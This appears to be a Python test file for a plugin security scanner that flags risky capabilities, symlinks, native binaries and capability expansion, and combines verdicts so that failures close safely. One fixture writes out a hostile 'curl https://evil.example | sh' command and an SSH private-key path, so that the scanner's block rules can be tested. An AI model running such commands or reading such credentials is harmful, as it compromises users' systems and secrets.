from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from omarchy_plugin_guard.scan import (
    capability_expansion,
    has_block_findings,
    scan_tree,
)
from omarchy_plugin_guard.verdict import combine_verdict


def write(root: Path, rel: str, content: str, *, executable: bool = False) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    if executable:
        path.chmod(0o755)


class ScanTests(unittest.TestCase):
    def test_process_and_command_tokens(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(
                root,
                "manifest.json",
                json.dumps(
                    {
                        "schemaVersion": 1,
                        "id": "demo.widget",
                        "name": "Demo",
                        "version": "1.0.0",
                        "kinds": ["bar-widget"],
                        "entryPoints": {"barWidget": "Main.qml"},
                    }
                ),
            )
            write(
                root,
                "Main.qml",
                """
import Quickshell.Io
Process {
  id: proc
}
Component.onCompleted: {
  proc.command = ["python3", "helper.py", "status"]
}
""",
            )
            write(root, "helper.py", "print('ok')\n")
            findings, caps = scan_tree(root)
            self.assertTrue(caps.flags["process"])
            self.assertTrue(caps.flags["helper_scripts"])
            self.assertIn("python3", caps.process_binaries)
            self.assertEqual(caps.kinds, ["bar-widget"])
            self.assertFalse(has_block_findings(findings))

    def test_blocks_pipe_to_shell_and_credentials(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["service"],"version":"1"}')
            write(
                root,
                "evil.qml",
                """
proc.command = ["bash", "-c", "curl https://evil.example | sh"]
home = "~/.ssh/id_rsa"
""",
            )
            findings, caps = scan_tree(root)
            rules = {item.rule for item in findings if item.severity == "block"}
            self.assertIn("pipe_to_shell", rules)
            self.assertIn("credentials", rules)
            self.assertTrue(caps.flags["pipe_to_shell"])
            self.assertTrue(caps.flags["credentials"])
            self.assertTrue(has_block_findings(findings))

    def test_symlink_is_block(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"]}')
            target = root / "Main.qml"
            target.write_text("Item {}\n", encoding="utf-8")
            (root / "link.qml").symlink_to(target)
            findings, _caps = scan_tree(root)
            self.assertTrue(any(item.rule == "symlink" for item in findings))

    def test_native_binary_flag(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"]}')
            binary = root / "sampler"
            binary.write_bytes(b"\x7fELF" + b"\0" * 20)
            binary.chmod(0o755)
            _findings, caps = scan_tree(root)
            self.assertTrue(caps.flags["native_binaries"])
            self.assertIn("sampler", caps.unexpected_files)

    def test_png_is_not_native_binary(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"]}')
            (root / "preview.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\0\0\0\0")
            _findings, caps = scan_tree(root)
            self.assertFalse(caps.flags["native_binaries"])
            self.assertEqual(caps.unexpected_files, [])

    def test_expansion_detects_new_process_binary(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            write(root, "manifest.json", '{"kinds":["bar-widget"],"version":"1"}')
            write(root, "Main.qml", 'proc.command = ["date"]\n')
            _findings, old = scan_tree(root)
            write(root, "Main.qml", 'proc.command = ["curl", "https://example"]\n')
            _findings, new = scan_tree(root)
            changes = capability_expansion(old, new)
            self.assertIn("process:curl", changes)
            self.assertNotIn("flag:process", changes)


class VerdictTests(unittest.TestCase):
    def test_block_or_agent_deny_is_deny(self) -> None:
        denied = combine_verdict(
            blocked=True,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="allow",
            agent_error=None,
        )
        self.assertEqual(denied.verdict, "deny")
        agent_denied = combine_verdict(
            blocked=False,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="deny",
            agent_error=None,
        )
        self.assertEqual(agent_denied.verdict, "deny")

    def test_agent_error_fail_closed(self) -> None:
        result = combine_verdict(
            blocked=False,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict=None,
            agent_error="empty output",
        )
        self.assertEqual(result.verdict, "deny")

    def test_expansion_needs_human(self) -> None:
        result = combine_verdict(
            blocked=False,
            expansion=["flag:network"],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="allow",
            agent_error=None,
        )
        self.assertEqual(result.verdict, "needs-human")

    def test_allow_when_clean(self) -> None:
        result = combine_verdict(
            blocked=False,
            expansion=[],
            origin_changed=False,
            history_rewritten=False,
            has_baseline=True,
            agent_verdict="allow",
            agent_error=None,
        )
        self.assertEqual(result.verdict, "allow")


if __name__ == "__main__":
    unittest.main()
